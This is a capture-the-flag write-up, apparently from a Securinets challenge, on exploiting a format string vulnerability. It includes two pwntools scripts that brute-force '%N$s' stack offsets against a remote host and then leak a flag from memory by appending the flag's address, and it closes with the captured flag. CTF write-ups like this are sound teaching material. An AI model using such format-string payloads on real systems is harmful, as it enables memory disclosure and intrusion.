![image](https://github.com/user-attachments/assets/8df712ef-03ab-41ba-a351-3e1daa23acde)

This task contains a format string vulnerability due to the way user input is handled in the challenge function.

In this challenge, the flag is stored at a specific memory address inside the program. Our goal is to find this address and leak or manipulate it . 

Since the exact location of the flag is unknown, we brute-force format string offsets (%1$s, %2$s, etc.) to identify which stack position points to the flag.
```Python
from pwn import *
host = "51.77.140.155"
port = 1339
for i in range(1, 16):
    try:
        #p = process("./main")
        p = remote(host, port)
        payload = f'%{i}$s\n'
        p.sendline(payload.encode())
        response = p.recvall().decode().strip()
        print(f"Position {i:2}: {response}")
        p.close()
    except Exception as e:
        print(f"Error testing position {i}: {str(e)}")
```
Now that we’ve identified %9$s as the offset pointing to the flag’s location in memory, we can craft a payload to directly leak the flag. Here’s the workflow:
```Python
#KOOOuull w Wakkell_
from pwn import *
binary = './main'
elf = ELF(binary)
flag_addr = elf.symbols['flag']
p = process(binary)
p = remote("51.77.140.155", 1339)
payload = f'%9$s'.encode().ljust(8, b'A') + p64(flag_addr)
p.sendline(payload)
p.recvuntil(b'called: ')
leak = p.recvline().strip()
info(leak)
p.interactive()
```

![image](https://github.com/user-attachments/assets/aa311869-488c-4d11-89a5-178ee94d1ac0)

FLAG: Securinets{4ba212af96b04be1bf46b7a6ae73e66565b}

Resources :

https://ctf-wiki.mahaloz.re/pwn/linux/summary/get-address/

https://aeb.win.tue.nl/linux/hh/formats-teso.html

